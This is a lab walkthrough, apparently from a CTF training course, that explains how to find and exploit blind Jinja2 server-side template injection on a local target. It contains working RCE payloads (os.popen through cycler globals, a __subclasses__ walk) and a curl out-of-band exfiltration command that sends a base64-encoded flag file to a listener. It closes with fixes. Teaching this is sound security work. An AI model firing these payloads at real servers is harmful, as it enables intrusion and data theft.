# Lab 01 — Walkthrough & Explanation

> Open this only after your attempt. Compare it to what you did, especially
> where you got stuck.

## 1. What "blind" means here

Normal SSTI: you send `{{7*7}}` and `49` comes back on the page. Here the server
renders your input but returns a fixed `{"status":"queued"}`. The template is
still evaluated — you just can't *see* it. So you need a side channel: something
the server does that you **can** observe. Two exist for this lab:

- **Time** — make the render take measurably longer.
- **Out-of-band (OOB)** — make the server send a network request to *you*.

## 2. Confirm the injection (timing oracle)

You can't see output, so prove execution by making the response slow. `sleep`
runs inside the render; the HTTP reply can't return until it finishes:

```bash
# baseline — returns instantly
time curl -s -o /dev/null http://127.0.0.1:8000/feedback \
  --data-urlencode 'name=x' --data 'message=x'

# injected — hangs ~4s, which proves the template evaluated your code
time curl -s -o /dev/null http://127.0.0.1:8000/feedback \
  --data-urlencode "name={{ cycler.__init__.__globals__.os.popen('sleep 4').read() }}" \
  --data 'message=x'
```

A clean ~4s gap = blind SSTI with code execution confirmed. (Before you reach
for RCE you'd normally fingerprint the engine with `{{7*7}}` vs `{{7*'7'}}` — but
blind, you confirm the *math* via timing too, e.g. a payload that only sleeps in
one engine. For this lab it's Jinja2.)

## 3. Why that payload reaches `os`

Jinja2's `Environment` exposes a few harmless-looking globals. `cycler` is one.
The climb:

- `cycler.__init__` — an ordinary Python function (the constructor).
- `.__globals__` — every global in the *module* that function lives in.
- `.os` — that module imported `os`, so it's right there.
- `.popen('cmd').read()` — run a shell command, read its output.

`lipsum.__globals__.os.popen(...)` and
`cycler.__init__.__globals__.__builtins__.__import__('os').popen(...)` reach the
same place. The point isn't the exact word `cycler` — it's the pattern: **start
from any reachable object, walk `.__globals__` / `.__class__` / `__subclasses__`
until you hit `os` or `subprocess`.** When names are filtered (Lab 02, and real
targets), that generic walk is what saves you:

```
{{ ().__class__.__base__.__subclasses__() }}   # enumerate every loaded class,
                                               # find subprocess.Popen / os._wrap_close
```

## 4. Exfiltrate the flag (OOB)

Command output isn't returned, so pipe it to **yourself**. Your `listener.py` is
running on `:9000`. base64 the flag first so newlines and symbols don't break the
URL:

```bash
curl -s -o /dev/null http://127.0.0.1:8000/feedback \
  --data-urlencode "name={{ cycler.__init__.__globals__.os.popen('curl -s http://127.0.0.1:9000/exfil?d=\$(cat flag.txt | base64 | tr -d \"\\n\")').read() }}" \
  --data 'message=x'
```

Watch the listener terminal:

```
[23:32:19] >>> OOB CALLBACK <<<
  GET /exfil?d=ZmxhZ3tibDFuZF9zc3RpX3QxbWVfdGhlbl8wMGJfZXhmaWx9Cg==
```

Decode it:

```bash
echo 'ZmxhZ3tibDFuZF9zc3RpX3QxbWVfdGhlbl8wMGJfZXhmaWx9Cg==' | base64 -d
# flag{bl1nd_ssti_t1me_then_00b_exfil}
```

## 5. The transferable lesson

This exact shape — **confirm blind by timing or callback, then exfil OOB,
base64-wrapped** — is identical for blind SQLi (`;SELECT ... INTO OUTFILE` /
DNS), blind OS command injection (`; curl you`), and blind XXE (external DTD).
Your listener is the free, self-hosted Collaborator. In a finals box with no
outbound HTTP, you swap it for DNS exfil (data in subdomains) via `interactsh`.

## 6. The fix (so you recognise a patched one)

- Never concatenate user input into a template source string.
- Pass user data as **render context**, never as template code:
  `render_template("hi.html", name=name)` not `from_string("Hi " + name)`.
- If dynamic templates are unavoidable, use a sandboxed engine
  (`SandboxedEnvironment`) or a logicless one (Mustache).
